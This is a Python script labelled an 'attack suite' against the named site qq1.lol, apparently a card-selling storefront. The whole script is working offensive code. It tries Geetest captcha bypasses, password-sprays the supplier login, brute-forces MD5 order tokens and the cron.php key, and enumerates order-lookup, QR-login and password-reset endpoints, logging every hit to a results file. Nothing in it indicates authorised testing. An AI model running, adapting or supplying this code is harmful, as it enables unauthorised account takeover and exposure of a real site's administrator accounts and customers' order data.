#!/usr/bin/env python3
"""qq1.lol attack suite: sup brute, skey test, cron keys, findpwd"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

BASE = "https://qq1.lol"
OUT = os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol")
TIMEOUT = 15

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
sess = requests.Session()
sess.headers.update({"User-Agent": UA})


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)


def init_session(referer=BASE + "/"):
    sess.get(BASE + "/", timeout=TIMEOUT)
    sess.headers["Referer"] = referer
    sess.headers["X-Requested-With"] = "XMLHttpRequest"


def get_geetest():
    r = sess.get(f"{BASE}/ajax.php?act=captcha&t={int(time.time())}", timeout=TIMEOUT)
    try:
        return r.json()
    except Exception:
        return {}


def sup_login(user, pwd, geetest=None):
    data = {"user": user, "pass": pwd}
    if geetest:
        data.update(geetest)
    r = sess.post(f"{BASE}/sup/ajax.php?act=login", data=data, timeout=TIMEOUT)
    try:
        return r.json()
    except Exception:
        return {"raw": r.text[:200]}


def test_geetest_bypass():
    log("=== Geetest bypass tests (sup login) ===")
    init_session(BASE + "/sup/login.php")
    gt = get_geetest()
    log(f"captcha: gt={gt.get('gt','')[:20]} success={gt.get('success')}")

    bypass_payloads = [
        {},
        {"geetest_challenge": "", "geetest_validate": "", "geetest_seccode": ""},
        {"geetest_challenge": "test", "geetest_validate": "test", "geetest_seccode": "test"},
        {"geetest_challenge": gt.get("challenge", ""), "geetest_validate": gt.get("challenge", ""), "geetest_seccode": gt.get("challenge", "") + "|jordan"},
        {"token": "test"},
    ]
    for i, g in enumerate(bypass_payloads):
        r = sup_login("admin", "admin", g)
        log(f"  bypass#{i}: {r}")

    # test if captcha_type can be skipped via direct POST
    for user in ["admin", "buyi", "root", "test", "sup"]:
        r = sup_login(user, "123456")
        if r.get("code") not in (2, -1) or "密码" in str(r.get("msg", "")):
            log(f"  ** interesting {user}: {r}")


def sup_weak_brute():
    log("=== Sup weak password spray ===")
    users = ["admin", "buyi", "buyiq", "root", "test", "sup", "supplier", "qq1", "manager", "布衣"]
    passwords = [
        "admin", "123456", "123456789", "12345678", "admin123", "admin888",
        "buyi", "buyiq", "qq1", "qq123456", "password", "111111", "666666",
        "888888", "123123", "admin@123", "Admin123", "a123456", "qwerty",
        "1234567890", "admin666", "admin8888", "root", "test", "test123",
        "buyi123", "buyi888", "qqkqq", "QQKZC", "830603", "123456789s",
    ]
    init_session(BASE + "/sup/login.php")
    hits = []
    for user in users:
        for pwd in passwords:
            r = sup_login(user, pwd)
            msg = str(r.get("msg", r))
            # code 2 = need captcha, code -1 = wrong creds maybe
            if r.get("code") == 0:
                hits.append((user, pwd, r))
                log(f"  HIT! {user}:{pwd} -> {r}")
            elif "密码" in msg and "空" not in msg:
                log(f"  cred_check {user}:{pwd} -> {msg}")
            elif r.get("code") not in (2, -1, -4):
                log(f"  unusual {user}:{pwd} -> {r}")
            time.sleep(0.3)
    return hits


def test_skey_patterns():
    log("=== Skey pattern testing ===")
    init_session()
    # common 发卡系统 skey = md5(id + syskey) variants
    test_ids = [1, 100, 1000, 25900, 25915]
    salts = ["", "qq1", "buyi", "faka", "rainbow", "123456", "key", "secret", "syskey", "authkey"]
    for oid in test_ids[:3]:
        for salt in salts:
            for fmt in [
                f"{oid}{salt}",
                f"{salt}{oid}",
                f"{oid}_{salt}",
                f"order{oid}{salt}",
            ]:
                skey = hashlib.md5(fmt.encode()).hexdigest()
                r = sess.post(f"{BASE}/ajax.php?act=order", data={"id": oid, "skey": skey}, timeout=TIMEOUT)
                try:
                    d = r.json()
                    if d.get("code") == 0:
                        log(f"  ** SKEY HIT id={oid} salt={salt} fmt={fmt} -> {str(d)[:200]}")
                        return d
                    elif d.get("msg") != "验证失败":
                        log(f"  diff msg id={oid} skey={skey[:8]} -> {d}")
                except Exception:
                    pass
    log("  no skey pattern matched")
    return None


def test_order_query():
    log("=== Order query enumeration ===")
    init_session()
    # try contact-based query
    for data in ["13800138000", "test@test.com", "123456789", "admin", "buyi"]:
        r = sess.get(f"{BASE}/?mod=query&data={urllib.parse.quote(data)}", timeout=TIMEOUT)
        if "没有查询到" not in r.text and "没有任何订单" not in r.text and "orderItem" in r.text:
            log(f"  ** query hit data={data}")
        elif "tbody" in r.text and "empty" not in r.text:
            log(f"  possible hit: {data}")


def cron_brute():
    log("=== cron.php key brute ===")
    keys = [
        "123456", "cron", "monitor", "key", "secret", "qq1", "buyi", "buyiq",
        "admin", "password", "faka", "authkey", "syskey", "888888", "666666",
        "qq1.lol", "qqkqq", "QQKZC", "rainbow", "epay", "mckuai", "mckuai123",
        "jiankong", "jiankongmiyue", "cronkey", "monitorkey", "1234567890",
        "abcdef", "test", "ka1", "ka1.one", "buyi123", "by123456",
    ]
    for k in keys:
        for param in ["key", "authkey", "token", "pwd", "pass"]:
            r = sess.get(f"{BASE}/cron.php?{param}={k}", timeout=TIMEOUT)
            if "监控密钥不正确" not in r.text and r.text.strip():
                log(f"  ** cron hit {param}={k} -> {r.text[:200]}")
                return k
    log("  no cron key found")
    return None


def test_findpwd_enum():
    log("=== findpwd / qrlogin enum ===")
    init_session(BASE + "/sup/findpwd.php")
    # qrlogin endpoint
    for ep in [
        "sup/qrlogin.php?do=getqrpic",
        "user/qrlogin.php?do=getqrpic",
        "sup/findpwd.php?act=qrlogin",
        "user/findpwd.php?act=qrlogin",
    ]:
        try:
            r = sess.get(f"{BASE}/{ep}", timeout=TIMEOUT)
            log(f"  {ep}: [{r.status_code}] {r.text[:120]}")
        except Exception as e:
            log(f"  {ep}: err {e}")


def test_hashsalt_leak():
    log("=== hashsalt analysis ===")
    r = sess.get(f"{BASE}/?mod=buy&cid=14&tid=118", timeout=TIMEOUT)
    m = re.search(r"var hashsalt=([^;]+);", r.text)
    if m:
        hs = m.group(1)
        log(f"  hashsalt expr len={len(hs)}")
        # try eval hashsalt endpoints without proper value
        r2 = sess.post(f"{BASE}/ajax.php?act=getshuoshuo", data={"uin": "123456", "page": 1, "hashsalt": "test"}, timeout=TIMEOUT)
        log(f"  getshuoshuo test: {r2.text[:150]}")


def main():
    import os
    os.makedirs(OUT, exist_ok=True)
    results = {"ts": datetime.now().isoformat()}

    test_hashsalt_leak()
    test_geetest_bypass()
    results["sup_hits"] = sup_weak_brute()
    results["skey"] = test_skey_patterns()
    test_order_query()
    results["cron_key"] = cron_brute()
    test_findpwd_enum()

    out = f"{OUT}/attack_results.json"
    with open(out, "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)
    log(f"=== Done -> {out} ===")


if __name__ == "__main__":
    main()
